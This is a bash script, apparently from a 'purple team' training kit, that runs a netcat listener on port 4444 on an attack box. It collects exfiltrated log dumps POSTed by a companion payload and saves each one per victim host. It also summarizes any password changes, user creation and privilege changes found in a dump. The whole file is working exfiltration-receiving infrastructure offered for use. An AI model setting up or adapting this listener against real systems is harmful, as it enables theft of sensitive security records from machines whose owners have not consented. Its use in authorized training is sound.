#!/bin/bash
# =============================================================
#  PANDA LISTENER  -  Purple Team Training Exercise
#  Receives exfil dumps from panda_kali.sh via HTTP POST.
#  Run this on your attack box before deploying the payload.
# =============================================================

# ── Configuration ─────────────────────────────────────────────
LISTEN_PORT="4444"
OUTPUT_DIR="./panda_logs"
LOG_INDEX="$OUTPUT_DIR/.index.log"

# ── Colors ────────────────────────────────────────────────────
RED='\e[31m'; GREEN='\e[32m'; YELLOW='\e[33m'
CYAN='\e[36m'; BOLD='\e[1m'; RESET='\e[0m'

# ── Preflight checks ──────────────────────────────────────────
if ! command -v nc &>/dev/null; then
    echo -e "${RED}[FAIL]${RESET} netcat (nc) not found. Install with: apt install netcat-openbsd"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"

echo -e "${BOLD}"
cat << 'BANNER'
  ############################
  ################         ###
  ##############  # ### ###  #
  ##################### ######      PANDA LISTENER
  ############################       Purple Team Exercise
  ############################
  ########  ##################
  ############################
BANNER
echo -e "${RESET}"
echo -e "${CYAN}Output directory :${RESET} $OUTPUT_DIR"
echo -e "${CYAN}Listening on port:${RESET} $LISTEN_PORT"
echo -e "${CYAN}Press Ctrl+C to stop.${RESET}"
echo ""

# ── Parse an incoming HTTP POST dump ──────────────────────────
# Reads from stdin (piped from nc), extracts headers + body,
# writes body to a timestamped file, prints a summary.
handle_connection() {
    local tmpfile
    tmpfile=$(mktemp)

    # Read everything nc gives us into a temp file
    cat > "$tmpfile"

    # Extract custom headers
    local hostname timestamp filename
    hostname=$(grep -i "^X-Hostname:"  "$tmpfile" | head -1 | awk '{print $2}' | tr -d '\r')
    timestamp=$(grep -i "^X-Timestamp:" "$tmpfile" | head -1 | awk '{print $2}' | tr -d '\r')
    filename=$(grep -i  "^X-Filename:"  "$tmpfile" | head -1 | awk '{print $2}' | tr -d '\r')

    # Find the blank line separating headers from body (CRLF CRLF)
    # Everything after it is the log body
    local body
    body=$(awk 'found{print} /^\r?$/{found=1}' "$tmpfile")

    # Fall back if headers weren't parsed (raw dump, no HTTP wrapper)
    if [ -z "$hostname" ]; then
        hostname="unknown"
        timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)
        filename="raw_$(date +%Y%m%d_%H%M%S).txt"
        body=$(cat "$tmpfile")
    fi

    # Sanitize filename for safety
    filename=$(echo "$filename" | tr -cd '[:alnum:]_.-')
    [ -z "$filename" ] && filename="dump_$(date +%Y%m%d_%H%M%S).txt"

    # Write body to output dir, prefixed with hostname
    local outfile="$OUTPUT_DIR/${hostname}_${filename}"
    echo "$body" > "$outfile"

    local linecount
    linecount=$(echo "$body" | wc -l)
    local bytecount
    bytecount=$(wc -c < "$outfile")

    # Log to index
    echo "$(date '+%Y-%m-%d %H:%M:%S') | host=$hostname | file=$outfile | bytes=$bytecount" \
        >> "$LOG_INDEX"

    # Print summary
    echo -e "${GREEN}[+] DUMP RECEIVED${RESET} $(date '+%H:%M:%S')"
    echo -e "    ${CYAN}Host     :${RESET} $hostname"
    echo -e "    ${CYAN}Timestamp:${RESET} $timestamp"
    echo -e "    ${CYAN}Saved to :${RESET} $outfile"
    echo -e "    ${CYAN}Size     :${RESET} $bytecount bytes / $linecount lines"

    # Print a quick summary of what was found in each section
    echo -e "    ${CYAN}Contents :${RESET}"
    for section in "PASSWORD CHANGES" "USER CREATION" "USER DELETION" "PERMISSION / PRIVILEGE CHANGES"; do
        local count
        count=$(echo "$body" | grep -A 50 "=== $section ===" | \
                grep -B 50 "^===" | grep -v "^===" | grep -c '.')
        if [ "$count" -gt 0 ]; then
            echo -e "      ${YELLOW}[!]${RESET} $section: $count lines"
        else
            echo -e "          $section: (none)"
        fi
    done
    echo ""

    rm -f "$tmpfile"
}

# ── Signal handler ────────────────────────────────────────────
trap 'echo -e "\n${YELLOW}[*] Listener stopped.${RESET}"; exit 0' INT TERM

# ── Main listen loop ──────────────────────────────────────────
echo -e "${GREEN}[*] Waiting for connections...${RESET}"
echo ""

while true; do
    # nc exits after each connection; loop re-listens immediately
    nc -lvp "$LISTEN_PORT" 2>/dev/null | handle_connection

    # Small delay to avoid hammering CPU if something connects/drops fast
    sleep 0.5
done
